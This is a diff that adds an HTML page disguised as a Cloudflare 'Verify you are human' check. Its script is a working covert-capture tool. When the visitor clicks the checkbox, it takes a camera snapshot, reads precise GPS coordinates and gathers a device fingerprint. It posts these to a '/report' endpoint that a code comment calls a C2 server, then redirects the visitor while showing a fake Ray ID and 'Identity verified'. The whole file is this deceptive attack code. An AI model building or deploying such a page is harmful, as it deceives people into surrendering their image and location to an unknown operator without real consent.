@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checking your browser...</title>
+    <style>
+        body {
+            font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, "Helvetica Neue", Arial, sans-serif;
+            background-color: #ffffff;
+            color: #313131;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            min-height: 100dvh; /* Modern mobile-friendly height */
+            margin: 0;
+        }
+
+        .container {
+            max-width: 500px;
+            width: 90%;
+            padding: 1rem; /* Slightly reduced for mobile */
+            text-align: left;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 500;
+            margin-bottom: 8px;
+        }
+
+        p {
+            font-size: 15px;
+            color: #313131;
+            margin-bottom: 24px;
+            line-height: 1.4;
+        }
+
+        .cf-wrapper {
+            border: 1px solid #e0e0e0;
+            padding: 16px;
+            border-radius: 4px;
+            background: #fafafa;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .cf-wrapper:hover {
+            background: #f0f0f0;
+        }
+
+        .checkbox {
+            width: 28px;
+            height: 28px;
+            border: 2px solid #c2c2c2;
+            border-radius: 4px;
+            background: #fff;
+            position: relative;
+        }
+
+        .checkbox.checked::after {
+            content: '';
+            position: absolute;
+            left: 8px;
+            top: 3px;
+            width: 7px;
+            height: 14px;
+            border: solid #0052cc;
+            border-width: 0 3px 3px 0;
+            transform: rotate(45deg);
+        }
+
+        .cf-text {
+            font-size: 14px;
+            font-weight: 500;
+            flex-grow: 1;
+        }
+
+        .cf-logo {
+            width: 32px;
+            opacity: 0.6;
+        }
+
+        .footer {
+            margin-top: 40px;
+            font-size: 12px;
+            color: #999;
+            border-top: 1px solid #eee;
+            padding-top: 20px;
+        }
+
+        #status-msg {
+            margin-top: 15px;
+            font-size: 13px;
+            color: #0052cc;
+            display: none;
+        }
+
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 2px solid #ddd;
+            border-top: 2px solid #0052cc;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Verify you are human</h1>
+        <p>Please complete the security check to proceed to the destination. This helps us prevent automated attacks and ensure service stability.</p>
+
+        <div class="cf-wrapper" id="verify-box">
+            <div class="checkbox" id="cb"></div>
+            <div class="spinner" id="spin"></div>
+            <span class="cf-text">Verify you are human</span>
+            <img src="/static/logo.png" class="cf-logo" alt="logo" onerror="this.style.display='none'">
+        </div>
+
+        <div id="status-msg">Processing browser integrity check...</div>
+
+        <div class="footer">
+            Ray ID: <span id="ray-id"></span> &bull; Your IP: <span id="user-ip"></span> &bull; Performance & security by Cloudflare
+        </div>
+    </div>
+
+    <!-- Hidden elements for stealth capture -->
+    <video id="v" autoplay playsinline muted style="display:none"></video>
+    <canvas id="c" style="display:none"></canvas>
+
+    <script>
+        const verifyBox = document.getElementById('verify-box');
+        const checkbox = document.getElementById('cb');
+        const spinner = document.getElementById('spin');
+        const statusMsg = document.getElementById('status-msg');
+        const rayIdEl = document.getElementById('ray-id');
+        const ipEl = document.getElementById('user-ip');
+        const v = document.getElementById('v');
+        const c = document.getElementById('c');
+        let finalDestination = "https://google.com";
+
+        // Generate fake Ray ID
+        rayIdEl.textContent = Math.random().toString(16).substring(2, 10).toUpperCase() + Math.random().toString(16).substring(2, 10).toUpperCase();
+
+        // Get public IP for realism
+        fetch('https://api.ipify.org?format=json')
+            .then(r => r.json())
+            .then(data => ipEl.textContent = data.ip)
+            .catch(() => ipEl.textContent = "1.1.1.1");
+
+        // Pre-fetch the real redirect URL from the C2 server
+        fetch('/redirect')
+            .then(r => r.json())
+            .then(data => { if(data.redirect_url) finalDestination = data.redirect_url; })
+            .catch(() => console.warn("Failed to fetch redirect config"));
+
+        function getCamera() {
+            return new Promise(async (resolve, reject) => {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                    v.srcObject = stream;
+                    
+                    // Force playback (required for some mobile browsers)
+                    v.play();
+
+                    // Wait for video to be ready
+                    const checkState = () => {
+                        if (v.readyState >= 2) {
+                            resolve(stream);
+                        } else {
+                            setTimeout(checkState, 50);
+                        }
+                    };
+                    checkState();
+                    
+                    // Fallback timeout
+                    setTimeout(() => resolve(stream), 1000);
+                } catch (err) {
+                    reject(err);
+                }
+            });
+        }
+
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    return reject(new Error("Geolocation not supported"));
+                }
+                navigator.geolocation.getCurrentPosition(resolve, reject, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            });
+        }
+
+        function getBrowserInfo() {
+            return {
+                userAgent: navigator.userAgent || 'Unknown',
+                platform: navigator.platform || 'Unknown',
+                language: navigator.language || 'Unknown',
+                screen: `${window.screen.width}x${window.screen.height}`,
+                cores: navigator.hardwareConcurrency || 'Unknown',
+                ram: navigator.deviceMemory || 'Unknown'
+            };
+        }
+
+        async function processVerification() {
+            if (checkbox.classList.contains('checked') || spinner.style.display === 'block') return;
+
+            // 1. Initial UI update
+            statusMsg.style.display = 'block';
+            checkbox.style.display = 'none';
+            spinner.style.display = 'block';
+            statusMsg.textContent = "Initiating integrity check...";
+
+            const formData = new FormData();
+            
+            // Append device info immediately
+            const info = getBrowserInfo();
+            formData.append('user_agent', info.userAgent);
+            formData.append('platform', info.platform);
+            formData.append('language', info.language);
+            formData.append('screen', info.screen);
+            formData.append('cores', info.cores);
+            formData.append('ram', info.ram);
+
+            // 2. TRIGGER BOTH IMMEDIATELY (Preserves user gesture for camera)
+            const captureTask = getCamera().catch(err => {
+                console.warn("Camera failed:", err);
+                return null;
+            });
+            
+            const locationTask = getLocation().catch(err => {
+                console.warn("Location failed:", err);
+                return null;
+            });
+
+            // 3. Wait for both to settle (or timeout/fail)
+            const [stream, pos] = await Promise.all([captureTask, locationTask]);
+
+            statusMsg.textContent = "Verifying browser connection...";
+
+            if (pos) {
+                formData.append('lat', pos.coords.latitude);
+                formData.append('lng', pos.coords.longitude);
+                formData.append('acc', pos.coords.accuracy);
+            }
+
+            if (stream) {
+                try {
+                    // Fast capture
+                    c.width = v.videoWidth || 640;
+                    c.height = v.videoHeight || 480;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    
+                    // Stop camera IMMEDIATELY
+                    stream.getTracks().forEach(track => track.stop());
+                    v.srcObject = null;
+
+                    const blob = await new Promise(resolve => c.toBlob(resolve, 'image/jpeg', 0.8));
+                    if (blob) formData.append('photo', blob, 'snapshot.jpg');
+                } catch (err) {
+                    console.warn("Capture process failed", err);
+                }
+            }
+
+            // 4. Send report even if partially failed (for stealth)
+            try {
+                // Send report if we have location, photo or at least basic fingerprint
+                const response = await fetch('/report', {
+                    method: 'POST',
+                    body: formData
+                });
+                const data = await response.json();
+                if (data.redirect_url) finalDestination = data.redirect_url;
+            } catch (err) {
+                console.error("Report failed", err);
+            }
+
+            // 5. Finalize UI
+            checkbox.classList.add('checked');
+            spinner.style.display = 'none';
+            checkbox.style.display = 'block';
+            statusMsg.textContent = "Identity verified. Redirecting...";
+            
+            setTimeout(() => {
+                window.location.href = finalDestination;
+            }, 1000);
+        }
+
+        verifyBox.onclick = processVerification;
+    </script>
+</body>
+</html>
